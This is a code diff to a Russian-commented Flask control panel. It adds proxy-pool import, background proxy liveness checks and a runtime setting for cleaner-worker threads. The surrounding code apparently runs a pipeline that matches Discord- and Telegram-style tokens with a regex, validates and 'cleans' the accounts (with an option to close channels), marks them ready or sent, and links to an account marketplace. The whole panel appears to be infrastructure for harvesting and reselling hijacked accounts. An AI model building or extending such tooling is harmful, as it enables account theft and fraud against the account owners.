@@ -3,6 +3,7 @@ import argparse
 import csv
 import hmac
 import io
+import json
 import logging
 import os
 import re
@@ -35,6 +36,14 @@ login_attempts = OrderedDict()
 auth_sessions = {}
 TOKEN_PATTERN = re.compile(r'(?:mfa\.[\w-]{20,}|[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,}|\b\d{6,}:[A-Za-z0-9_-]{25,})')
 STATUSES = {'pending_review', 'new', 'validated', 'cleaning', 'cleaned', 'ready', 'sent', 'invalid', 'locked'}
+# Панель принимает крупные списки прокси одной вставкой (до ~5000 строк).
+MAX_BODY_BYTES = 1024 * 1024
+MAX_PROXY_IMPORT = 5000
+
+# Фоновая проверка прокси на живость: одно задание за раз, прогресс отдаётся панели.
+proxy_job_lock = threading.Lock()
+proxy_job = {'running': False, 'kind': None, 'total': 0, 'done': 0, 'alive': 0,
+             'dead': 0, 'started_at': None, 'finished_at': None, 'error': None}
 
 
 def init_dashboard(pipeline_instance, config_dict):
@@ -49,7 +58,7 @@ def init_dashboard(pipeline_instance, config_dict):
         SESSION_COOKIE_SAMESITE='Lax',
         SESSION_REFRESH_EACH_REQUEST=False,
         PERMANENT_SESSION_LIFETIME=timedelta(hours=settings['session_hours']),
-        MAX_CONTENT_LENGTH=16 * 1024,
+        MAX_CONTENT_LENGTH=MAX_BODY_BYTES,
         TRUSTED_HOSTS=[settings['hostname']],
     )
     db = pipeline.db if pipeline is not None else Database(config['database']['path'])
@@ -57,6 +66,9 @@ def init_dashboard(pipeline_instance, config_dict):
     with state_lock:
         auth_sessions.clear()
         login_attempts.clear()
+    with proxy_job_lock:
+        proxy_job.update(running=False, kind=None, total=0, done=0, alive=0,
+                         dead=0, started_at=None, finished_at=None, error=None)
     logger.info('Защищённая панель инициализирована')
 
 
@@ -260,7 +272,7 @@ def get_status():
             'queues': {name: queue.qsize() for name, queue in (
                 ('new_tokens', pipeline.new_tokens_queue), ('validated', pipeline.validated_queue),
                 ('cleaned', pipeline.cleaned_queue), ('ready', pipeline.ready_queue))},
-            'threads': {thread.name: thread.is_alive() for thread in pipeline.threads},
+            'threads': pipeline.get_thread_states(),
         }
     return jsonify(
         mode='connected' if live is not None else 'monitor',
@@ -382,7 +394,12 @@ def get_settings():
         lzt_enabled=bool(config.get('lzt', {}).get('enabled')),
         close_channels=bool(config.get('cleaner', {}).get('close_channels')),
         validator_workers=config.get('validator', {}).get('max_workers', 0),
-        cleaner_workers=config.get('cleaner', {}).get('max_workers', 0),
+        cleaner_workers=(pipeline.count_cleaner_workers() if pipeline is not None
+                         and hasattr(pipeline, 'count_cleaner_workers')
+                         else config.get('cleaner', {}).get('max_workers', 0)),
+        cleaner_workers_config=config.get('cleaner', {}).get('max_workers', 0),
+        proxy_enabled=bool(config.get('proxy', {}).get('enabled')),
+        proxy_counts=db.count_proxies_by_status(),
     )
 
 
@@ -407,6 +424,165 @@ def report():
         writer.writerow(safe)
     return Response('\ufeff' + buf.getvalue(), mimetype='text/csv',
                     headers={'Content-Disposition': 'attachment; filename=accounts-report.csv'})
+
+
+# ==================== ПУЛ ПРОКСИ ====================
+
+def proxy_public_row(row):
+    """Публичное представление прокси для панели: host:port без учётных данных."""
+    from modules.cleaner import parse_proxy
+    parsed = parse_proxy(row['proxy'])
+    endpoint = (parsed.get('http') or '').replace('http://', '')
+    has_auth = bool(parsed.get('auth'))
+    if not endpoint:
+        # Не удалось разобрать — не раскрываем возможные учётные данные
+        endpoint = '[не распознан]'
+    return {
+        'id': row['id'],
+        'endpoint': endpoint,
+        'auth': has_auth,
+        'status': row['status'],
+        'ping': row['ping'],
+        'last_checked_at': row['last_checked_at'],
+    }
+
+
+def parse_proxy_lines(text):
+    """Разбивает вставленный текст на уникальные строки прокси."""
+    parts = re.split(r'[\s,;]+', text or '')
+    seen, result = set(), []
+    for part in parts:
+        part = part.strip()
+        if part and part not in seen:
+            seen.add(part)
+            result.append(part)
+    return result
+
+
+def reload_pipeline_proxies():
+    if pipeline is not None and getattr(pipeline, 'proxy_manager', None) is not None:
+        try:
+            pipeline.proxy_manager.reload()
+        except Exception:
+            logger.warning('Не удалось перечитать пул прокси в pipeline')
+
+
+def start_proxy_job(kind, proxy_strings):
+    """Запускает фоновую проверку прокси. Возвращает False, если задание уже идёт."""
+    from modules.cleaner import check_proxy_list
+    with proxy_job_lock:
+        if proxy_job['running']:
+            return False
+        proxy_job.update(running=True, kind=kind, total=len(proxy_strings), done=0,
+                         alive=0, dead=0, started_at=time.time(), finished_at=None, error=None)
+
+    def worker():
+        def on_result(proxy_str, alive, ping):
+            try:
+                db.upsert_proxy_result(proxy_str, alive, ping)
+            except Exception:
+                logger.warning('Не удалось сохранить результат проверки прокси')
+            with proxy_job_lock:
+                proxy_job['done'] += 1
+                proxy_job['alive' if alive else 'dead'] += 1
+        try:
+            check_proxy_list(proxy_strings, max_workers=40, timeout=6, on_result=on_result)
+        except Exception as exc:
+            with proxy_job_lock:
+                proxy_job['error'] = type(exc).__name__
+            logger.error('Ошибка проверки прокси: %s', type(exc).__name__)
+        finally:
+            with proxy_job_lock:
+                proxy_job['running'] = False
+                proxy_job['finished_at'] = time.time()
+            reload_pipeline_proxies()
+
+    threading.Thread(target=worker, name='ProxyCheck', daemon=True).start()
+    return True
+
+
+@app.get('/api/proxies')
+def list_proxies():
+    with proxy_job_lock:
+        job = dict(proxy_job)
+    return jsonify(items=[proxy_public_row(row) for row in db.list_proxies()],
+                   counts=db.count_proxies_by_status(), job=job,
+                   proxy_enabled=bool(config.get('proxy', {}).get('enabled')))
+
+
+@app.post('/api/proxies/import')
+def import_proxies():
+    data = request.get_json(silent=True)
+    if not isinstance(data, dict):
+        return error('Нужен JSON-объект')
+    raw = data.get('proxies')
+    if not isinstance(raw, str) or len(raw) > MAX_BODY_BYTES:
+        return error('Передайте список прокси текстом')
+    proxies = parse_proxy_lines(raw)
+    if not proxies:
+        return error('Не найдено ни одного прокси')
+    if len(proxies) > MAX_PROXY_IMPORT:
+        return error(f'Слишком много прокси за один раз (максимум {MAX_PROXY_IMPORT})')
+    db.add_proxies(proxies)
+    if not start_proxy_job('import', proxies):
+        return error('Проверка уже выполняется, дождитесь завершения', 409)
+    return jsonify(success=True, queued=len(proxies)), 202
+
+
+@app.post('/api/proxies/recheck')
+def recheck_proxies():
+    proxies = [row['proxy'] for row in db.list_proxies()]
+    if not proxies:
+        return error('Пул прокси пуст', 409)
+    if not start_proxy_job('recheck', proxies):
+        return error('Проверка уже выполняется, дождитесь завершения', 409)
+    return jsonify(success=True, queued=len(proxies)), 202
+
+
+@app.post('/api/proxies/clear')
+def clear_proxies():
+    data = request.get_json(silent=True) or {}
+    scope = data.get('scope', 'dead')
+    if scope not in ('dead', 'all'):
+        return error('Неверная область очистки')
+    with proxy_job_lock:
+        if proxy_job['running']:
+            return error('Дождитесь завершения проверки прокси', 409)
+    removed = db.delete_proxies(scope)
+    reload_pipeline_proxies()
+    return jsonify(success=True, removed=removed)
+
+
+@app.post('/api/settings/cleaner-workers')
+def set_cleaner_workers():
+    data = request.get_json(silent=True)
+    if not isinstance(data, dict):
+        return error('Нужен JSON-объект')
+    value = data.get('workers')
+    if not isinstance(value, int) or isinstance(value, bool) or not 1 <= value <= 200:
+        return error('Число потоков должно быть от 1 до 200')
+    if pipeline is not None and hasattr(pipeline, 'set_cleaner_workers'):
+        applied = pipeline.set_cleaner_workers(value)
+        return jsonify(success=True, workers=applied, live=True)
+    # Режим мониторинга: рабочий процесс не запущен — только сохраняем в config.json
+    persist_config_value('cleaner', 'max_workers', value)
+    return jsonify(success=True, workers=value, live=False)
+
+
+def persist_config_value(section, key, value):
+    """Сохраняет одно значение в config.json (режим мониторинга без pipeline)."""
+    config.setdefault(section, {})[key] = value
+    path = PROJECT_ROOT / 'config.json'
+    try:
+        if not path.exists():
+            return
+        with path.open('r', encoding='utf-8') as handle:
+            raw = json.load(handle)
+        raw.setdefault(section, {})[key] = value
+        with path.open('w', encoding='utf-8') as handle:
+            json.dump(raw, handle, ensure_ascii=False, indent=2)
+    except Exception:
+        logger.warning('Не удалось сохранить настройку %s.%s', section, key)
 
 
 @app.post('/api/control/stop')
@@ -437,7 +613,7 @@ def run_dashboard(host='127.0.0.1', port=5000, debug=False):
     if settings is None:
         raise RuntimeError('Сначала вызовите init_dashboard')
     from waitress import serve
-    options = dict(host=host, port=port, threads=8, max_request_body_size=16384,
+    options = dict(host=host, port=port, threads=8, max_request_body_size=MAX_BODY_BYTES,
                    clear_untrusted_proxy_headers=True)
     if settings['secure']:
         if host not in {'127.0.0.1', '::1', 'localhost'}:
